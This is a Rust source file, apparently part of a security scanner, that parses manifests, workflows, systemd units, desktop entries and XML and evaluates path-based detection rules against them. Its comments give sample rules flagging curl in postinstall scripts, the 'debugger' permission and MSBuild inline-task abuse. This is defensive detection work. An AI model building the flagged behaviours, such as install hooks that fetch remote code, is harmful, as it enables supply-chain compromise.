//! Key-Value condition evaluator for structured manifest files and systemd units.
//!
//! Supports querying JSON, YAML, TOML, and systemd service files using path expressions.
//!
//! # Path Syntax
//! - `key` - Access object key
//! - `a.b.c` - Nested access
//! - `[0]` - Array index
//! - `[*]` - All array elements (wildcard)
//!
//! # Examples
//! ```yaml
//! # Check if permissions array contains "debugger"
//! type: value
//! path: "permissions"
//! exact: "debugger"
//!
//! # Check if any content script targets all URLs
//! type: value
//! path: "content_scripts[*].matches"
//! exact: "<all_urls>"
//!
//! # Check if postinstall script contains curl
//! type: value
//! path: "scripts.postinstall"
//! substr: "curl"
//! ```

use crate::analyzers::utils::{MAX_XML_DEPTH, parse_xml_safe};
use crate::composite_rules::condition::{ArrayQuantifier, Condition, KvQuery};
use crate::composite_rules::context::EvaluationContext;
use crate::types::Evidence;
use rustc_hash::FxHashMap;
use serde_json::Value;
use std::path::Path;

/// Detected format of the structured data file.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum StructuredFormat {
    /// JSON format
    Json,
    /// YAML format
    Yaml,
    /// TOML format
    Toml,
    /// Apple Property List (XML or Binary)
    Plist,
    /// Python PKG-INFO / METADATA (RFC 822 format)
    PkgInfo,
    /// systemd service unit file (.service, .service.d/*.conf)
    SystemdService,
    /// freedesktop.org Desktop Entry (.desktop)
    DesktopEntry,
    /// Generic XML document (MSBuild project, SVG, XML config)
    Xml,
    /// Format could not be determined
    Unknown,
}

/// A segment in a parsed path expression.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum PathSegment {
    /// Object key access: `"permissions"` or `"scripts"`
    Key(String),
    /// Array index access: `[0]`, `[1]`
    Index(usize),
    /// Wildcard array access: `[*]` - matches all elements
    Wildcard,
}

/// Matcher for comparing values at a path.
#[derive(Debug, Default)]
pub(crate) struct KvMatcher {
    /// Require exact string equality
    pub exact: Option<String>,
    /// Require the value to contain this substring
    pub substr: Option<String>,
    /// Pre-computed lowercase of substr (avoids allocation per match)
    substr_lower: Option<String>,
    /// Require the value to match this compiled regex
    pub regex: Option<std::sync::Arc<crate::composite_rules::condition::TraitRegex>>,
    /// If true, perform case-insensitive matching
    pub case_insensitive: bool,
    /// Explicit existence check (Some(true) = must exist, Some(false) = must not exist)
    /// Note: exists check is handled in evaluate_kv before matches() is called
    #[allow(dead_code)]
    pub exists: Option<bool>,
    /// Minimum collection size (array elements or object keys)
    pub length_min: Option<usize>,
    /// Maximum collection size (array elements or object keys)
    pub length_max: Option<usize>,
    /// Optional high-fidelity validation check applied to the resolved value.
    /// Set after construction so the existing `new()` signature is untouched.
    pub is_check: Option<crate::composite_rules::condition::StringValidator>,
    pub not: Vec<crate::composite_rules::condition::NotException>,
}

impl KvMatcher {
    /// Create a new matcher from condition parameters.
    #[must_use]
    pub(crate) fn new(
        exact: Option<&String>,
        substr: Option<&String>,
        regex: Option<&std::sync::Arc<crate::composite_rules::condition::TraitRegex>>,
        case_insensitive: bool,
        exists: Option<bool>,
        length_min: Option<usize>,
        length_max: Option<usize>,
    ) -> Self {
        // Pre-compute lowercase pattern to avoid allocation per match
        let substr_lower = if case_insensitive {
            substr.map(|s| s.to_lowercase())
        } else {
            None
        };
        Self {
            exact: exact.cloned(),
            substr: substr.cloned(),
            substr_lower,
            regex: regex.map(std::sync::Arc::clone),
            case_insensitive,
            exists,
            length_min,
            length_max,
            is_check: None,
            not: Vec::new(),
        }
    }

    /// Check if a value matches this matcher.
    ///
    /// For arrays, returns true if any element matches (for string matchers).
    /// For scalars, checks the value directly.
    /// If no matcher is specified (existence check), returns true.
    /// Also checks length constraints: len() of the value — string bytes,
    /// array elements, or object keys.
    #[must_use]
    pub(crate) fn matches(&self, value: &Value) -> bool {
        // Check length constraints FIRST — len() by value shape. Strings use
        // byte length, replacing the `.{200,4096}`-style regex length proxies
        // that unrolled into oversized NFAs. Numbers/bools/null have no len(),
        // so a length bound on them never matches.
        let len = match value {
            Value::Array(arr) => Some(arr.len()),
            Value::Object(obj) => Some(obj.len()),
            Value::String(s) => Some(s.len()),
            _ => None,
        };
        if self.length_min.is_some() || self.length_max.is_some() {
            let Some(len) = len else { return false };
            if self.length_min.is_some_and(|min| len < min)
                || self.length_max.is_some_and(|max| len > max)
            {
                return false;
            }
        }

        // If no string matcher specified, just check existence (path resolved).
        // `is:` counts as a matcher: `path: office.creator, is: random_like`
        // has no exact/substr/regex and still has to inspect the value.
        if self.exact.is_none()
            && self.substr.is_none()
            && self.regex.is_none()
            && self.is_check.is_none()
        {
            return true;
        }

        match value {
            Value::Array(arr) => {
                // For arrays, check if any element matches
                arr.iter().any(|v| self.scalar_matches(v))
            }
            _ => self.scalar_matches(value),
        }
    }

    /// Check if a scalar value matches the matcher.
    fn scalar_matches(&self, value: &Value) -> bool {
        let s = value_to_string(value);

        // The validator gates every other matcher, exactly as it does for the
        // text conditions: a value must satisfy `is:` before anything else is
        // consulted. With no other matcher set, passing it is the whole test.
        if !crate::composite_rules::evaluators::symbol_string::validate_match(&s, self.is_check) {
            return false;
        }
        if self.not.iter().any(|exc| exc.matches(&s)) {
            return false;
        }
        if self.exact.is_none() && self.substr.is_none() && self.regex.is_none() {
            return true;
        }

        if let Some(ref exact_val) = self.exact {
            return if self.case_insensitive {
                s.eq_ignore_ascii_case(exact_val)
            } else {
                s == *exact_val
            };
        }

        if let Some(ref substr_val) = self.substr {
            return if self.case_insensitive {
                let s_lower = s.to_lowercase();
                // Use pre-computed lowercase if available, else compute (for direct struct init)
                if let Some(ref pattern_lower) = self.substr_lower {
                    s_lower.contains(pattern_lower.as_str())
                } else {
                    // Fallback: compute lowercase (happens when struct initialized directly)
                    s_lower.contains(&substr_val.to_lowercase())
                }
            } else {
                s.contains(substr_val.as_str())
            };
        }

        if let Some(ref re) = self.regex {
            return re.is_match(&s);
        }

        false
    }
}

/// Frame on the object/array nesting stack while indexing JSON key offsets.
struct JsonFrame {
    is_object: bool,
    /// Current member key whose value is being scanned (object frames only).
    cur_key: Option<String>,
}

/// Find the closing quote of the JSON string starting at `start` (the opening
/// `"`), honouring `\"`/`\\` escapes, and return the raw inner slice plus the
/// index just past the closing quote. Escape sequences are left literal — manifest
/// keys are plain identifiers, so the raw slice equals the parsed key.
fn scan_json_string(text: &str, start: usize) -> (&str, usize) {
    let bytes = text.as_bytes();
    let mut i = start + 1;
    while i < bytes.len() {
        match bytes[i] {
            b'\\' => i += 2, // skip the backslash and its (ASCII) escape char
            b'"' => return (&text[start + 1..i], i + 1),
            _ => i += 1,
        }
    }
    (&text[start + 1..], bytes.len())
}

/// Index every object key in a JSON document to its byte offset, keyed by the
/// dotted object-key path (array nesting is transparent, matching how trait
/// paths address values). Built in one linear pass per file and cached, so
/// value-match findings get a real location without re-scanning per match.
/// Keeps the first occurrence of each path. Assumes serde already validated the
/// document, so it tolerates structure rather than re-validating it.
fn build_json_key_offsets(text: &str) -> FxHashMap<String, u64> {
    let bytes = text.as_bytes();
    let mut map: FxHashMap<String, u64> = FxHashMap::default();
    let mut stack: Vec<JsonFrame> = Vec::new();
    let mut expecting_key = false;
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'{' => {
                stack.push(JsonFrame {
                    is_object: true,
                    cur_key: None,
                });
                expecting_key = true;
                i += 1;
            }
            b'[' => {
                stack.push(JsonFrame {
                    is_object: false,
                    cur_key: None,
                });
                expecting_key = false;
                i += 1;
            }
            b'}' | b']' => {
                stack.pop();
                expecting_key = false;
                i += 1;
            }
            b',' => {
                if let Some(frame) = stack.last_mut() {
                    frame.cur_key = None;
                    expecting_key = frame.is_object;
                }
                i += 1;
            }
            b'"' => {
                let start = i;
                let (content, next) = scan_json_string(text, i);
                i = next;
                let top_is_object = stack.last().is_some_and(|f| f.is_object);
                if top_is_object && expecting_key {
                    let prefix = stack
                        .iter()
                        .filter_map(|f| f.cur_key.as_deref())
                        .collect::<Vec<_>>()
                        .join(".");
                    let path = if prefix.is_empty() {
                        content.to_string()
                    } else {
                        format!("{prefix}.{content}")
                    };
                    map.entry(path).or_insert(start as u64);
                    if let Some(frame) = stack.last_mut() {
                        frame.cur_key = Some(content.to_string());
                    }
                    expecting_key = false;
                }
            }
            _ => i += 1,
        }
    }
    map
}

/// Dotted object-key path of a parsed condition path, dropping array
/// `Index`/`Wildcard` segments so it lines up with [`build_json_key_offsets`].
fn segments_dotted(segments: &[PathSegment]) -> String {
    segments
        .iter()
        .filter_map(|s| match s {
            PathSegment::Key(k) => Some(k.as_str()),
            _ => None,
        })
        .collect::<Vec<_>>()
        .join(".")
}

/// Convert a JSON value to a string for matching.
fn value_to_string(value: &Value) -> String {
    match value {
        Value::String(s) => s.clone(),
        Value::Number(n) => n.to_string(),
        Value::Bool(b) => b.to_string(),
        Value::Null => "null".to_string(),
        // For arrays and objects, serialize to JSON string
        _ => value.to_string(),
    }
}

/// Detect the format of a structured data file.
///
/// Only recognizes known manifest filenames plus explicit systemd service paths to avoid
/// processing arbitrary structured data files.
#[must_use]
pub(crate) fn detect_format(path: &Path, content: &[u8]) -> StructuredFormat {
    let path_str = path.to_string_lossy().to_lowercase();

    // Check filename patterns for known manifests
    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
        let name_lower = name.to_lowercase();

        // Known JSON manifests
        if name_lower == "package.json"
            || name_lower == "package-lock.json"
            || name_lower == "manifest.json"
            || name_lower == "composer.json"
        {
            return StructuredFormat::Json;
        }

        // Known TOML manifests
        if name_lower == "cargo.toml" || name_lower == "pyproject.toml" {
            return StructuredFormat::Toml;
        }

        // Known YAML files - GitHub Actions workflows and composite actions
        if (path_str.contains(".github/workflows/") || path_str.contains(".github\\workflows\\"))
            && (name_lower.ends_with(".yml") || name_lower.ends_with(".yaml"))
        {
            return StructuredFormat::Yaml;
        }
        if name_lower == "action.yml" || name_lower == "action.yaml" {
            return StructuredFormat::Yaml;
        }

        // systemd service units and drop-ins
        if name_lower.ends_with(".service") {
            return StructuredFormat::SystemdService;
        }
        if (path_str.contains(".service.d/") || path_str.contains(".service.d\\"))
            && name_lower.ends_with(".conf")
        {
            return StructuredFormat::SystemdService;
        }

        // freedesktop.org Desktop Entry files
        if name_lower.ends_with(".desktop") {
            return StructuredFormat::DesktopEntry;
        }

        // Generic XML by extension (.xml, .csproj, .xaml, etc.)
        if name_lower.ends_with(".xml")
            || name_lower.ends_with(".csproj")
            || name_lower.ends_with(".vbproj")
            || name_lower.ends_with(".fsproj")
            || name_lower.ends_with(".vcxproj")
            || name_lower.ends_with(".proj")
            || name_lower.ends_with(".props")
            || name_lower.ends_with(".targets")
            || name_lower.ends_with(".xaml")
            || name_lower.ends_with(".svg")
        {
            return StructuredFormat::Xml;
        }

        // Python package metadata files (RFC 822 format)
        if name_lower == "pkg-info" || name_lower == "metadata" {
            return StructuredFormat::PkgInfo;
        }

        // Plist files - check by extension since they're commonly used in macOS apps
        if name_lower.ends_with(".plist") {
            return StructuredFormat::Plist;
        }
    }

    // Limited content sniffing for special cases only
    // Check binary magic bytes BEFORE UTF-8 conversion for performance

    // Check for Binary Plist (binary format)
    if content.starts_with(b"bplist") {
        return StructuredFormat::Plist;
    }

    if looks_like_github_actions_workflow(content) {
        return StructuredFormat::Yaml;
    }

    // Check for XML Plist (text format)
    if content.starts_with(b"<?xml") {
        // Only convert minimal bytes needed to check for plist
        let preview = &content[..content.len().min(200)];
        let preview_str = String::from_utf8_lossy(preview);
        if preview_str.contains("<plist") || preview_str.contains("<!DOCTYPE plist") {
            return StructuredFormat::Plist;
        }
        // Any other `<?xml`-prolog document is generic XML.
        return StructuredFormat::Xml;
    }
    if content.starts_with(b"<plist") {
        return StructuredFormat::Plist;
    }

    // Content-sniffed XML for extensionless files that start with a well-known
    // root element. Matches the narrow set in filefacts::fileid XML detection, so the
    // value evaluator sees the same files fileid classifies as Xml.
    if content.starts_with(b"<Project ") || content.starts_with(b"<Project\t") {
        let head = &content[..content.len().min(512)];
        if memchr::memmem::find(head, b"schemas.microsoft.com/developer/msbuild").is_some() {
            return StructuredFormat::Xml;
        }
    }
    for prefix in [
        &b"<svg "[..],
        &b"<svg>"[..],
        &b"<rss "[..],
        &b"<feed "[..],
        &b"<RDF "[..],
        &b"<configuration>"[..],
        &b"<configuration "[..],
        &b"<manifest "[..],
        &b"<Configuration "[..],
    ] {
        if content.starts_with(prefix) {
            return StructuredFormat::Xml;
        }
    }

    // Check for PKG-INFO/METADATA format (RFC 822 headers)
    // Only convert first 200 bytes for header check
    let preview = &content[..content.len().min(200)];
    let preview_str = String::from_utf8_lossy(preview);
    let trimmed = preview_str.trim_start();

    if trimmed.starts_with("Metadata-Version:") {
        return StructuredFormat::PkgInfo;
    }

    // No other content sniffing - only process known filenames / unit paths
    StructuredFormat::Unknown
}

fn looks_like_github_actions_workflow(content: &[u8]) -> bool {
    let Ok(text) = std::str::from_utf8(&content[..content.len().min(16 * 1024)]) else {
        return false;
    };

    let mut has_on = false;
    let mut has_jobs = false;

    for line in text.lines() {
        let line = line.trim_end();
        if line.is_empty() || line.starts_with("---") || line.starts_with('#') {
            continue;
        }
        if line.starts_with(' ') || line.starts_with('\t') {
            continue;
        }

        let Some((key, _)) = line.split_once(':') else {
            continue;
        };
        let key = key.trim_matches(|c| c == '\'' || c == '"' || c == ' ');

        match key {
            "on" => has_on = true,
            "jobs" => has_jobs = true,
            _ => {}
        }

        if has_on && has_jobs {
            return true;
        }
    }

    false
}

/// Split a path on the optional `<filename>::` sibling-file prefix.
///
/// Returns `(sibling_basename, remaining_path)`. When `path` contains no
/// `::`, the sibling is `None` and the whole input is the remaining path.
/// When the prefix is present, the sibling is the part before `::` and
/// the remaining path is what follows.
///
/// The split is on the FIRST `::` so paths like `pkg.json::a::b` resolve
/// to sibling `pkg.json`, remaining `a::b` — the latter would then fail
/// to parse as path segments. That's intentional: nested cross-file
/// references aren't supported.
pub(crate) fn split_qualified_path(path: &str) -> (Option<&str>, &str) {
    match path.find("::") {
        Some(idx) => (Some(&path[..idx]), &path[idx + 2..]),
        None => (None, path),
    }
}

/// Parse a path string into segments.
///
/// # Examples
/// - `"permissions"` -> `[Key("permissions")]`
/// - `"scripts.postinstall"` -> `[Key("scripts"), Key("postinstall")]`
/// - `"content_scripts[*].matches"` -> `[Key("content_scripts"), Wildcard, Key("matches")]`
/// - `"items[0]"` -> `[Key("items"), Index(0)]`
///
/// To use the optional `<filename>::` prefix, call [`split_qualified_path`]
/// first.
pub(crate) fn parse_path(path: &str) -> Result<Vec<PathSegment>, String> {
    let mut segments = Vec::new();
    let mut current_key = String::new();
    let mut chars = path.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '.' => {
                if !current_key.is_empty() {
                    if current_key == "*" {
                        segments.push(PathSegment::Wildcard);
                    } else {
                        segments.push(PathSegment::Key(current_key.clone()));
                    }
                    current_key.clear();
                }
            }
            '[' => {
                if !current_key.is_empty() {
                    segments.push(PathSegment::Key(current_key.clone()));
                    current_key.clear();
                }

                // Three shapes inside the brackets:
                //   ["literal"]  or  ['literal']  — quoted key (lets the
                //     caller traverse object keys that contain dots or
                //     reserved chars, e.g. macOS entitlement OIDs).
                //   [*]                            — wildcard
                //   [N]                            — numeric index
                if matches!(chars.peek(), Some('"') | Some('\'')) {
                    // SAFETY: the `matches!(chars.peek(), Some(...))` arm
                    // above proves `next()` returns `Some`.
                    let Some(quote) = chars.next() else { break };
                    let mut key = String::new();
                    let mut closed = false;
                    for next_c in chars.by_ref() {
                        if next_c == quote {
                            closed = true;
                            break;
                        }
                        key.push(next_c);
                    }
                    if !closed {
                        return Err(format!("unterminated quoted key in path: [{quote}{key}"));
                    }
                    match chars.next() {
                        Some(']') => {}
                        Some(other) => {
                            return Err(format!("expected ']' after quoted key, got {other:?}",));
                        }
                        None => {
                            return Err("expected ']' after quoted key, got EOF".into());
                        }
                    }
                    segments.push(PathSegment::Key(key));
                    continue;
                }

                let mut index_str = String::new();
                while let Some(&next_c) = chars.peek() {
                    if next_c == ']' {
                        chars.next();
                        break;
                    }
                    if let Some(ch) = chars.next() {
                        index_str.push(ch);
                    }
                }

                if index_str == "*" {
                    segments.push(PathSegment::Wildcard);
                } else if let Ok(idx) = index_str.parse::<usize>() {
                    segments.push(PathSegment::Index(idx));
                } else {
                    return Err(format!("invalid array index: [{}]", index_str));
                }
            }
            _ => {
                current_key.push(c);
            }
        }
    }

    if !current_key.is_empty() {
        if current_key == "*" {
            segments.push(PathSegment::Wildcard);
        } else {
            segments.push(PathSegment::Key(current_key));
        }
    }

    if segments.is_empty() {
        return Err("empty path".to_string());
    }

    Ok(segments)
}

/// Navigate to a path in a JSON value and return all matching values.
///
/// Wildcards expand to multiple values.
#[must_use]
pub(crate) fn navigate<'a>(value: &'a Value, segments: &[PathSegment]) -> Vec<&'a Value> {
    if segments.is_empty() {
        return vec![value];
    }

    let segment = &segments[0];
    let remaining = &segments[1..];

    match segment {
        PathSegment::Key(key) => {
            if let Value::Object(obj) = value
                && let Some(v) = obj.get(key)
            {
                return navigate(v, remaining);
            }
            Vec::new()
        }
        PathSegment::Index(idx) => {
            if let Value::Array(arr) = value
                && let Some(v) = arr.get(*idx)
            {
                return navigate(v, remaining);
            }
            Vec::new()
        }
        PathSegment::Wildcard => {
            let mut results = Vec::new();
            if let Value::Array(arr) = value {
                for item in arr {
                    results.extend(navigate(item, remaining));
                }
                return results;
            }
            if let Value::Object(obj) = value {
                for item in obj.values() {
                    results.extend(navigate(item, remaining));
                }
                return results;
            }
            Vec::new()
        }
    }
}

/// Parse PKG-INFO/METADATA format (RFC 822) into a JSON Value.
///
/// Format is simple key-value headers:
/// ```text
/// Metadata-Version: 2.1
/// Name: my-package
/// Version: 1.0.0
/// Summary: A package description
/// Author: Someone <someone@example.com>
/// ```
///
/// Multi-line values use continuation lines (starting with whitespace).
/// Multiple values for the same key become arrays.
fn parse_pkginfo(content: &[u8]) -> Option<Value> {
    let text = std::str::from_utf8(content).ok()?;
    let mut map: serde_json::Map<String, Value> = serde_json::Map::new();
    let mut current_key: Option<String> = None;
    let mut current_value = String::new();

    for line in text.lines() {
        if line.starts_with(' ') || line.starts_with('\t') {
            // Continuation line - append to current value
            if current_key.is_some() {
                current_value.push('\n');
                current_value.push_str(line.trim());
            }
        } else if let Some(colon_pos) = line.find(':') {
            // New header - save previous if any
            if let Some(key) = current_key.take() {
                insert_pkginfo_value(&mut map, &key, current_value.trim().to_string());
            }

            let key = line[..colon_pos].trim().to_string();
            let value = line[colon_pos + 1..].trim().to_string();
            current_key = Some(key);
            current_value = value;
        }
    }

    // Don't forget the last header
    if let Some(key) = current_key {
        insert_pkginfo_value(&mut map, &key, current_value.trim().to_string());
    }

    Some(Value::Object(map))
}

/// Insert a value into PKG-INFO map, handling multiple values for same key.
fn insert_pkginfo_value(map: &mut serde_json::Map<String, Value>, key: &str, value: String) {
    if value.is_empty() {
        return;
    }

    // Normalize key to lowercase with hyphens (like HTTP headers)
    let normalized_key = key.to_lowercase();

    if let Some(existing) = map.get_mut(&normalized_key) {
        // Key already exists - convert to array or append
        match existing {
            Value::Array(arr) => {
                arr.push(Value::String(value));
            }
            Value::String(s) => {
                let old = s.clone();
                *existing = Value::Array(vec![Value::String(old), Value::String(value)]);
            }
            _ => {}
        }
    } else {
        map.insert(normalized_key, Value::String(value));
    }
}

fn parse_systemd_service(content: &[u8]) -> Option<Value> {
    let text = std::str::from_utf8(content).ok()?;
    let mut root: serde_json::Map<String, Value> = serde_json::Map::new();
    let mut current_section: Option<String> = None;

    for line in collect_systemd_logical_lines(text) {
        let trimmed = line.trim();
        if let Some(section) = parse_systemd_section_header(trimmed) {
            current_section = Some(section);
            continue;
        }

        let Some(section_name) = current_section.as_deref() else {
            continue;
        };
        let Some(eq_pos) = line.find('=') else {
            continue;
        };

        let raw_key = line[..eq_pos].trim();
        if raw_key.is_empty() {
            continue;
        }
        let key = normalize_systemd_key(raw_key);
        if key.is_empty() {
            continue;
        }

        let raw_value = line[eq_pos + 1..].trim().to_string();
        let Some(section_obj) = ensure_json_object(&mut root, section_name) else {
            continue;
        };

        if raw_value.is_empty() && is_systemd_multi_value_key(&key) {
            clear_systemd_key(section_obj, &key);
            continue;
        }

        if key == "environment" {
            append_systemd_raw(section_obj, &key, raw_value.clone());
            let items = split_systemd_items(&raw_value);
            if !items.is_empty() {
                append_string_items(section_obj, "environment_list", items.clone());
                if let Some(env_obj) = ensure_json_object(section_obj, "environment") {
                    for item in items {
                        if let Some((name, value)) = item.split_once('=')
                            && !name.is_empty()
                        {
                            append_string_occurrence(env_obj, name, value.to_string());
                        }
                    }
                }
            }
            continue;
        }

        if is_systemd_command_key(&key) {
            append_systemd_raw(section_obj, &key, raw_value.clone());
            append_string_occurrence(section_obj, &key, raw_value);
            continue;
        }

        if is_systemd_token_list_key(&key) {
            append_systemd_raw(section_obj, &key, raw_value.clone());
            let items = split_systemd_items(&raw_value);
            if items.is_empty() {
                append_string_occurrence(section_obj, &key, raw_value);
            } else {
                append_string_items(section_obj, &key, items);
            }
            continue;
        }

        append_string_occurrence(section_obj, &key, raw_value);
    }

    if root.is_empty() {
        None
    } else {
        Some(Value::Object(root))
    }
}

/// Parse a freedesktop.org Desktop Entry file into a section-keyed JSON object.
///
/// Each section (e.g. `[Desktop Entry]`, `[Desktop Action foo]`) becomes a top-level
/// key (normalized to snake_case). Inside each section, keys are normalized the same
/// way as systemd keys, and known list-type values (`Categories`, `MimeType`,
/// `Keywords`, `Actions`, `OnlyShowIn`, `NotShowIn`, `Implements`) are split on `;`.
/// Localized key variants (e.g. `Name[cs]=...`) are dropped so only the canonical
/// value is exposed to trait authors.
fn parse_desktop_entry(content: &[u8]) -> Option<Value> {
    let text = std::str::from_utf8(content).ok()?;
    let mut root: serde_json::Map<String, Value> = serde_json::Map::new();
    let mut current_section: Option<String> = None;

    for raw_line in text.lines() {
        let line = raw_line.trim_end_matches('\r');
        let trimmed = line.trim_start();

        // Desktop entry spec: blank lines and `#` comments are ignored.
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        if let Some(section) = parse_desktop_section_header(trimmed) {
            current_section = Some(section);
            continue;
        }

        let Some(section_name) = current_section.as_deref() else {
            continue;
        };
        let Some(eq_pos) = line.find('=') else {
            continue;
        };

        let raw_key = line[..eq_pos].trim();
        if raw_key.is_empty() {
            continue;
        }

        // Drop localized variants (`Name[cs]=...`): the canonical unlocalized key
        // is enough for detection, and exposing per-locale keys makes trait authoring
        // unwieldy.
        if raw_key.contains('[') {
            continue;
        }

        let key = normalize_systemd_key(raw_key);
        if key.is_empty() {
            continue;
        }

        let raw_value = line[eq_pos + 1..].trim().to_string();
        let Some(section_obj) = ensure_json_object(&mut root, section_name) else {
            continue;
        };

        if is_desktop_list_key(&key) {
            append_systemd_raw(section_obj, &key, raw_value.clone());
            let items = split_desktop_list(&raw_value);
            if items.is_empty() {
                append_string_occurrence(section_obj, &key, raw_value);
            } else {
                append_string_items(section_obj, &key, items);
            }
            continue;
        }

        append_string_occurrence(section_obj, &key, raw_value);
    }

    if root.is_empty() {
        None
    } else {
        Some(Value::Object(root))
    }
}

/// Parse an XML document into a JSON value queryable by value paths.
///
/// Mapping rules:
/// - Root element becomes a top-level key: `{"Project": {...}}`.
/// - Attributes are prefixed with `@`: `{"@ToolsVersion": "4.0"}`.
/// - A single child element with unique tag → nested object.
/// - Multiple sibling elements with the same tag → array of objects.
/// - Element text content → `_text` key (or scalar value if the element has no
///   attributes and no children). Text from CDATA sections is included.
/// - Element namespaces are dropped from paths; only the local name is used.
///
/// Trait authors query paths like
/// `Project.UsingTask.@TaskFactory` (exact: `CodeTaskFactory`) to detect the
/// MSBuild inline-task LOLBAS, or `Project.UsingTask.Task.Code._text` for the
/// embedded source.
fn parse_xml_to_json(content: &[u8]) -> Option<Value> {
    let text = std::str::from_utf8(content).ok()?;
    // `parse_xml_safe` refuses over-deep documents before roxmltree's recursive
    // parser can overflow the stack; the per-node cap below is defense in depth
    // for the conversion's own recursion and the `serde_json::Value` drop.
    let doc = parse_xml_safe(text)?;
    let root = doc.root_element();
    let root_value = xml_element_to_json(root, 0);
    let mut map = serde_json::Map::new();
    map.insert(root.tag_name().name().to_string(), root_value);
    Some(Value::Object(map))
}

fn xml_element_to_json(node: roxmltree::Node<'_, '_>, depth: usize) -> Value {
    if depth >= MAX_XML_DEPTH {
        return Value::Null;
    }

    let mut children: serde_json::Map<String, Value> = serde_json::Map::new();

    for attr in node.attributes() {
        let key = format!("@{}", attr.name());
        children.insert(key, Value::String(attr.value().to_string()));
    }

    // Filefacts namespace declarations (xmlns=, xmlns:prefix=) ONLY at the point
    // they are declared, not inherited into every descendant. Skip a
    // declaration if the parent element already has it in scope.
    let parent = node.parent();
    for ns in node.namespaces() {
        let already_in_parent = parent
            .and_then(|p| p.lookup_namespace_uri(ns.name()))
            .is_some_and(|uri| uri == ns.uri());
        if already_in_parent {
            continue;
        }
        let key = match ns.name() {
            None => "@xmlns".to_string(),
            Some(prefix) => format!("@xmlns:{}", prefix),
        };
        children
            .entry(key)
            .or_insert_with(|| Value::String(ns.uri().to_string()));
    }

    let mut text_parts: Vec<String> = Vec::new();
    for child in node.children() {
        if child.is_element() {
            let name = child.tag_name().name().to_string();
            let value = xml_element_to_json(child, depth + 1);
            match children.get_mut(&name) {
                Some(Value::Array(arr)) => arr.push(value),
                Some(existing) => {
                    let old = std::mem::replace(existing, Value::Null);
                    *existing = Value::Array(vec![old, value]);
                }
                None => {
                    children.insert(name, value);
                }
            }
        } else if child.is_text()
            && let Some(t) = child.text()
        {
            let trimmed = t.trim();
            if !trimmed.is_empty() {
                text_parts.push(trimmed.to_string());
            }
        }
    }

    let combined_text = if text_parts.is_empty() {
        None
    } else {
        Some(text_parts.join(" "))
    };

    match (children.is_empty(), combined_text) {
        (true, Some(t)) => Value::String(t),
        (false, Some(t)) => {
            children.insert("_text".to_string(), Value::String(t));
            Value::Object(children)
        }
        (_, None) => Value::Object(children),
    }
}

fn parse_desktop_section_header(line: &str) -> Option<String> {
    if line.starts_with('[') && line.ends_with(']') && line.len() >= 3 {
        let inner = &line[1..line.len() - 1];
        let normalized = normalize_systemd_key(inner);
        if normalized.is_empty() {
            None
        } else {
            Some(normalized)
        }
    } else {
        None
    }
}

/// Keys whose value is a `;`-separated list per the Desktop Entry spec.
fn is_desktop_list_key(key: &str) -> bool {
    matches!(
        key,
        "only_show_in"
            | "not_show_in"
            | "actions"
            | "mime_type"
            | "categories"
            | "implements"
            | "keywords"
    )
}

/// Split a Desktop Entry list value on unescaped `;`.
///
/// Per freedesktop.org spec, `\;` escapes a literal semicolon inside a list item,
/// and `\s`/`\n`/`\r`/`\t`/`\\` are the standard string escapes.
fn split_desktop_list(input: &str) -> Vec<String> {
    let mut items = Vec::new();
    let mut current = String::new();
    let mut chars = input.chars().peekable();

    while let Some(ch) = chars.next() {
        if ch == '\\' {
            match chars.next() {
                Some('s') => current.push(' '),
                Some('n') => current.push('\n'),
                Some('r') => current.push('\r'),
                Some('t') => current.push('\t'),
                Some(';') => current.push(';'),
                Some('\\') | None => current.push('\\'),
                Some(other) => {
                    current.push('\\');
                    current.push(other);
                }
            }
        } else if ch == ';' {
            if !current.is_empty() {
                items.push(std::mem::take(&mut current));
            }
        } else {
            current.push(ch);
        }
    }

    if !current.is_empty() {
        items.push(current);
    }

    items
}

fn collect_systemd_logical_lines(text: &str) -> Vec<String> {
    let mut lines = Vec::new();
    let mut current = String::new();
    let mut continuing = false;

    for raw_line in text.lines() {
        let line = raw_line.trim_end_matches('\r');
        let trimmed_start = line.trim_start();

        if !continuing
            && (trimmed_start.is_empty()
                || trimmed_start.starts_with('#')
                || trimmed_start.starts_with(';'))
        {
            continue;
        }

        if continuing
            && (trimmed_start.is_empty()
                || trimmed_start.starts_with('#')
                || trimmed_start.starts_with(';'))
        {
            continue;
        }

        let segment = if continuing { trimmed_start } else { line };
        let segment = segment.trim_end();
        let has_continuation = ends_with_unescaped_backslash(segment);
        let piece = if has_continuation {
            segment[..segment.len().saturating_sub(1)].trim_end()
        } else {
            segment
        };

        current.push_str(piece);

        if has_continuation {
            current.push(' ');
            continuing = true;
        } else {
            let logical = current.trim();
            if !logical.is_empty() {
                lines.push(logical.to_string());
            }
            current.clear();
            continuing = false;
        }
    }

    let trailing = current.trim();
    if !trailing.is_empty() {
        lines.push(trailing.to_string());
    }

    lines
}

fn ends_with_unescaped_backslash(s: &str) -> bool {
    let mut count = 0usize;
    for ch in s.chars().rev() {
        if ch == '\\' {
            count += 1;
        } else {
            break;
        }
    }
    count % 2 == 1
}

fn parse_systemd_section_header(line: &str) -> Option<String> {
    let inner = line.strip_prefix('[')?.strip_suffix(']')?.trim();
    if inner.is_empty() {
        None
    } else {
        Some(normalize_systemd_key(inner))
    }
}

fn normalize_systemd_key(raw: &str) -> String {
    let chars: Vec<char> = raw.chars().collect();
    let mut out = String::new();

    for (idx, ch) in chars.iter().enumerate() {
        if ch.is_ascii_alphanumeric() {
            let is_upper = ch.is_ascii_uppercase();
            let prev = idx.checked_sub(1).and_then(|i| chars.get(i));
            let next = chars.get(idx + 1);
            let prev_is_lower_or_digit =
                prev.is_some_and(|c| c.is_ascii_lowercase() || c.is_ascii_digit());
            let prev_is_upper = prev.is_some_and(char::is_ascii_uppercase);
            let next_is_lower = next.is_some_and(char::is_ascii_lowercase);

            if is_upper
                && !out.is_empty()
                && (prev_is_lower_or_digit || (prev_is_upper && next_is_lower))
            {
                out.push('_');
            }
            out.push(ch.to_ascii_lowercase());
        } else if (*ch == '-' || *ch == ' ' || *ch == '.' || *ch == '/')
            && !out.ends_with('_')
            && !out.is_empty()
        {
            out.push('_');
        }
    }

    out.trim_matches('_').to_string()
}

fn is_systemd_token_list_key(key: &str) -> bool {
